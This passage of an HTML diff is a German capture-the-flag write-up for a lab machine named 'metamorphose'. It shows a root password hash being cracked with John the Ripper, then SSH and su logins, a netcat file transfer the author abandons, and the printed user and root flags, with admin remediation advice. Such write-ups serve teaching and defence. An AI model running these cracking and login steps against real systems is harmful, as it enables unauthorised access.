+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">echo "e2f7a3617512ed81aa68c7be9c435609cfb513b021ce07ee9d2759f08f4d9054" > hash</span></div> <span class="comment"><-- Roots Hash --></span>
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=RAW-SHA256</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
+[...]
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">my2monkeys</span>       (?) <span class="password"><-- Root Passwort gefunden! --></span>
+1g 0:00:00:00 DONE (2024-08-05 23:15) 16.66g/s [...]
+Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
+Session completed.</pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Der SHA256-Hash für den Benutzer `root` (aus dem Kafka-Topic extrahiert) wird in eine Datei `hash` gespeichert. John the Ripper (`john`) wird mit der `rockyou.txt`-Wortliste verwendet, um den Hash zu knacken.</p>
+             <p class="evaluation">**Bewertung:** **Erfolg!** John knackt den Hash und findet das Passwort für `root`: `my2monkeys`. Dies ist ein relativ schwaches Passwort.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Verwenden Sie `su root` oder `ssh root@...` mit dem Passwort `my2monkeys`, um Root-Zugriff zu erlangen. (*Der Log folgt jedoch einem anderen Pfad über `coralie`, möglicherweise wurde der Hash für `coralie` ebenfalls geknackt oder das Root-Passwort auch für `coralie` verwendet?*).<br>**Empfehlung (Admin):** Erzwingen Sie starke Passwörter für alle Benutzer, insbesondere Root. Überwachen Sie die Sicherheit von Kafka.</p>
+
+             <p class="comment">*(Anmerkung: Der Log springt nun zum SSH-Login als `coralie`. Es wird angenommen, dass der Hash für `coralie` (`9bf4...`) ebenfalls geknackt wurde oder dass das Root-Passwort fälschlicherweise auch für `coralie` funktioniert hat. Da `my2monkeys` später für `su root` verwendet wird, ist es wahrscheinlicher, dass `coralie`s Hash separat geknackt wurde, dies aber nicht im Log steht.)*</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh coralie@192.168.2.113</span></div>
+                     <pre>coralie@192.168.2.113's password: <span class="password">********</span> <span class="comment">(Geknacktes Passwort für coralie eingegeben)</span>
+Linux metamorphose.hmv 6.1.0-21-amd64 [...]
+[...]
+Last login: Tue May 28 11:18:43 2024
+<span class="prompt">coralie@metamorphose:~$</span> <span class="password"><-- Login als coralie erfolgreich! --></span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Erfolgreicher SSH-Login als Benutzer `coralie` mit dem (implizit) geknackten Passwort.</p>
+             <p class="evaluation">**Bewertung:** Eskalation von `melbourne` zu `coralie` über das Auslesen und Knacken des Passwort-Hashes aus Kafka.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** User-Flag lesen, `sudo -l` prüfen.<br>**Empfehlung (Admin):** Kafka sichern, starke Passwörter erzwingen.</p>
+         </section>
+
+        <section id="privilege-escalation-coralie">
+            <h2>Privilege Escalation (coralie -> root)</h2>
+             <p class="analysis">**Analyse:** Als `coralie` werden letzte Schritte zur Root-Eskalation unternommen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">coralie@metamorphose:~$ <span class="command">ls -la</span></div>
+                     <pre>
+[...]
+-rwx------ 1 coralie coralie   33 Feb 26 17:29 user.txt</pre>
+                     <div class="prompt">coralie@metamorphose:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">aab176494645050f3e8a7b081d443d3b</span></pre> <span class="comment"><-- User Flag --></span>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Im Home-Verzeichnis von `coralie` wird die `user.txt` gefunden und gelesen.</p>
+             <p class="evaluation">**Bewertung:** User-Flag erhalten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/erl-matter]
+└─# <span class="command">which debugfs</span></div>
+                     <pre>/usr/sbin/debugfs</pre>
+                      <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/erl-matter]
+└─# <span class="command">cp /usr/sbin/debugfs .</span></div>
+                      <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/erl-matter]
+└─# <span class="command">nc -q 5 -nvlp 4444 < debugfs</span></div>
+                      <pre>
+listening on [any] 4444 ...
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.113] 43820</pre>
+                     <pre><span class="comment">
+   es wird im Video leider nicht gezeigt wie die Lücke gefunden wurde
+   und wie alles funktioniert, bei mir klappt es nicht, daher warten wir
+   auf ein anderes TUT</span></pre>
+                 </div>
+            </div>
+             <p class="analysis">**Analyse:** Versuche im Zusammenhang mit `debugfs` und `nc`. Der Zweck ist unklar, und laut Kommentar handelt es sich um eine Sackgasse oder einen nicht funktionierenden Ansatz aus einer anderen Quelle.</p>
+             <p class="evaluation">**Bewertung:** Dieser Abschnitt scheint irrelevant für den erfolgreichen Eskalationspfad zu sein.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Ignorieren Sie diesen Pfad und verwenden Sie das zuvor geknackte Root-Passwort.<br>**Empfehlung (Admin):** Keine.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">melbourne@metamorphose:/opt/kafka/bin$ <span class="command">su root</span></div> <span class="comment"><-- Prompt passt nicht, sollte coralie@ sein --></span>
+                      <pre>Password: <span class="password">********</span> <span class="comment">(my2monkeys eingegeben)</span></pre>
+                      <div class="prompt">root@metamorphose:/opt/kafka/bin# <span class="comment"># Erfolg!</span></div>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** Aus der Shell von `coralie` (trotz `melbourne`-Prompt im Log) wird `su root` ausgeführt. Das Passwort `my2monkeys` (welches durch Knacken des Root-Hashes aus Kafka gefunden wurde) wird eingegeben.</p>
+              <p class="evaluation">**Bewertung:** Root-Zugriff erfolgreich erlangt durch Verwendung des geknackten Passworts.</p>
+              <p class="recommendation">**Empfehlung (Pentester):** Root-Flag lesen.<br>**Empfehlung (Admin):** Starke Passwörter erzwingen.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">root@metamorphose:/opt/kafka/bin# <span class="command">ls /root/root.txt</span></div>
+                      <pre>/root/root.txt</pre>
+                      <div class="prompt">root@metamorphose:/opt/kafka/bin# <span class="command">cat /root/root.txt</span></div>
+                      <pre><span class="password">ac7f9ad56c6a07f55cdfd71aec2e04d5</span></pre> <span class="comment"><-- Root Flag --></span>
+                      <pre><span class="comment">
+   Privilege Escalation erfolgreich</span></pre>
+                 </div>
+             </div>
+              <p class="analysis">**Analyse:** In der Root-Shell wird die Datei `/root/root.txt` gefunden und ihr Inhalt ausgelesen.</p>
+              <p class="evaluation">**Bewertung:** Root-Flag erfolgreich erhalten.</p>
+         </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <p class="analysis">**Analyse:** Zusammenfassung der gefundenen Flags.</p>
+
+                 <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                           <div class="flag-command">cat /home/coralie/user.txt</div>
+                           <div class="flag-value"><span class="password">aab176494645050f3e8a7b081d443d3b</span></div>
+                        </div>
+                    </center>
+                 </div>
+                 <p class="evaluation">**Bewertung:** User-Flag.</p>
+
+                <div class="code-block">
+                    <center>
+                        <div class="terminal"> <!-- Struktur laut Template -->
+                            <div class="flag-command">cat /root/root.txt</div>
+                            <div class="flag-value"><span class="password">ac7f9ad56c6a07f55cdfd71aec2e04d5</span></div>
+                        </div>
+                     </center>
+                </div>
+                <p class="evaluation">**Bewertung:** Root-Flag.</p>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 05. August 2024</p> <!-- Datum aus Nmap Scan -->
+    </footer>
+</body>
+</html>
